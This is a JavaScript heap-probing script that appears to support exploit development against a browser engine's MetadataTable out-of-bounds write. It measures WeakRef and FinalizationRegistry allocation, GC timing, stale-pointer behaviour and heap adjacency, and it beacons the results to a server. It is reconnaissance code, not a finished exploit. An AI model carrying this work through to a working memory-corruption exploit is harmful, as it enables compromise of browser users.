// p128 — WeakRef/FinalizationRegistry heap behavior probes
// Goal: understand WeakImpl allocation patterns for MetadataTable bridge
// WeakImpl is in bmalloc (WeakBlockMalloc), holds JSValue → JSCell pointer
// If MetadataTable OOB write corrupts WeakImpl.m_jsValue, WeakRef.deref()
// follows the corrupted pointer
// Beacon prefix: V128W-
(function(){
var rid='v128w'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V128W-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V128W-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe128-start');

// ======== W1: WeakRef basic behavior ========
function testW1(){
  var r={};
  try{
    // Confirm WeakRef works
    var obj={x:42,y:'hello'};
    var wr=new WeakRef(obj);
    r.deref1=(wr.deref()===obj);
    r.derefX=wr.deref().x;

    // WeakRef to various object types
    var arr=[1,2,3];
    var wrArr=new WeakRef(arr);
    r.arrDeref=(wrArr.deref()===arr);

    var ab=new ArrayBuffer(256);
    var wrAB=new WeakRef(ab);
    r.abDeref=(wrAB.deref()===ab);
    r.abLen=wrAB.deref().byteLength;

    // WeakRef to TypedArray
    var ta=new Uint32Array(64);
    ta[0]=0xDEADBEEF;
    var wrTA=new WeakRef(ta);
    r.taDeref=(wrTA.deref()===ta);
    r.taVal=wrTA.deref()[0].toString(16);

    // WeakRef to function
    var fn=function(){return 99;};
    var wrFn=new WeakRef(fn);
    r.fnDeref=(wrFn.deref()===fn);
    r.fnCall=wrFn.deref()();
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== W2: FinalizationRegistry + GC timing ========
function testW2(){
  var r={};
  try{
    var cleanupCalled=0;
    var cleanupValues=[];
    var registry=new FinalizationRegistry(function(value){
      cleanupCalled++;
      cleanupValues.push(value);
    });

    // Register objects with different held values
    for(var i=0;i<50;i++){
      var obj={idx:i};
      registry.register(obj,'token-'+i);
      // Don't hold reference — let it be GC'd
    }

    // Force GC pressure
    r.preGC_cleanup=cleanupCalled;
    for(var j=0;j<100;j++){
      var tmp=new ArrayBuffer(1048576); // 1MB allocations
      tmp=null;
    }
    r.postPressure_cleanup=cleanupCalled;

    // Wait and check
    return new Promise(function(resolve){
      setTimeout(function(){
        r.afterWait_cleanup=cleanupCalled;
        r.cleanupSample=cleanupValues.slice(0,5).join(',');
        resolve(r);
      },500);
    });
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== W3: Mass WeakRef allocation to understand WeakBlock layout ========
function testW3(){
  var r={};
  try{
    // Create many WeakRefs to understand allocation patterns
    var refs=[];
    var objects=[];
    var COUNT=1000;

    for(var i=0;i<COUNT;i++){
      var obj={id:i,pad:new ArrayBuffer(64)};
      objects.push(obj);
      refs.push(new WeakRef(obj));
    }
    r.created=COUNT;

    // Verify all alive
    var alive=0;
    for(var j=0;j<refs.length;j++){
      if(refs[j].deref()) alive++;
    }
    r.allAlive=(alive===COUNT);

    // Now null half the objects to trigger cleanup
    for(var k=0;k<COUNT;k+=2){
      objects[k]=null;
    }

    // GC pressure
    for(var m=0;m<50;m++){
      var tmp=new ArrayBuffer(2097152);
      tmp=null;
    }

    // Check which survived
    return new Promise(function(resolve){
      setTimeout(function(){
        var stillAlive=0;
        var dead=0;
        for(var n=0;n<refs.length;n++){
          if(refs[n].deref()) stillAlive++;
          else dead++;
        }
        r.stillAlive=stillAlive;
        r.dead=dead;
        r.expectedDead=COUNT/2;
        r.gcWorked=(dead>0);
        resolve(r);
      },500);
    });
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== W4: WeakRef + structuredClone transfer interaction ========
// Can we create a WeakRef to an ArrayBuffer, transfer the buffer,
// then deref the WeakRef? Does it follow a stale pointer?
function testW4(){
  var r={};
  try{
    var buf=new ArrayBuffer(256);
    new Uint8Array(buf).fill(0xAA);
    var wr=new WeakRef(buf);
    r.preTransfer=(wr.deref()===buf);
    r.preLen=wr.deref().byteLength;

    // Transfer the buffer
    var clone=structuredClone(buf,{transfer:[buf]});
    r.origDetached=(buf.byteLength===0);
    r.cloneLen=clone.byteLength;

    // Deref the WeakRef — does it still point to the detached buffer?
    var derefed=wr.deref();
    r.postTransferDeref=(derefed!==null&&derefed!==undefined);
    if(derefed){
      r.derefIsBuf=(derefed===buf);
      r.derefLen=derefed.byteLength;
      r.derefIsDetached=(derefed.byteLength===0);
      r.derefIsClone=(derefed===clone);
    }else{
      r.derefNull=true;
    }
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== W5: WeakRef survival across new Function() compilation ========
// When we compile a huge function (MetadataTable overflow target),
// do WeakRefs created beforehand survive? This tests heap adjacency.
function testW5(){
  var r={};
  try{
    // Create WeakRefs BEFORE compilation
    var preRefs=[];
    var preObjs=[];
    for(var i=0;i<100;i++){
      var obj={marker:'PRE-'+i,buf:new ArrayBuffer(128)};
      preObjs.push(obj);
      preRefs.push(new WeakRef(obj));
    }
    r.preCreated=100;

    // Compile a medium-size function (5M repeats = 20MB)
    var t0=Date.now();
    try{
      var src='a();'.repeat(5000000);
      var fn=new Function('a',src);
      r.compileOK=true;
      r.compileTime=Date.now()-t0;
      src=null;
    }catch(e){
      r.compileErr=e.constructor.name;
    }

    // Check WeakRefs survival
    var survived=0;
    for(var j=0;j<preRefs.length;j++){
      if(preRefs[j].deref()) survived++;
    }
    r.preSurvived=survived;
    r.preAllSurvived=(survived===100);

    // Create WeakRefs AFTER compilation
    var postRefs=[];
    var postObjs=[];
    for(var k=0;k<100;k++){
      var obj2={marker:'POST-'+k,buf:new ArrayBuffer(128)};
      postObjs.push(obj2);
      postRefs.push(new WeakRef(obj2));
    }

    // Verify post refs
    var postAlive=0;
    for(var m=0;m<postRefs.length;m++){
      if(postRefs[m].deref()) postAlive++;
    }
    r.postAlive=postAlive;
    fn=null;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== Run all ========
async function runAll(){
  var tests=[
    {name:'W1-WEAKREF-BASIC',fn:testW1},
    {name:'W2-FINREG-GC',fn:testW2},
    {name:'W3-MASS-WEAKREF',fn:testW3},
    {name:'W4-WEAKREF-TRANSFER',fn:testW4},
    {name:'W5-WEAKREF-COMPILE',fn:testW5}
  ];
  for(var t=0;t<tests.length;t++){
    try{
      var result=tests[t].fn();
      if(result&&typeof result.then==='function') result=await result;
      beacon(tests[t].name,result||{});
    }catch(e){
      beacon(tests[t].name,{fatal:e.constructor.name+':'+String(e.message||'').slice(0,80)});
    }
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
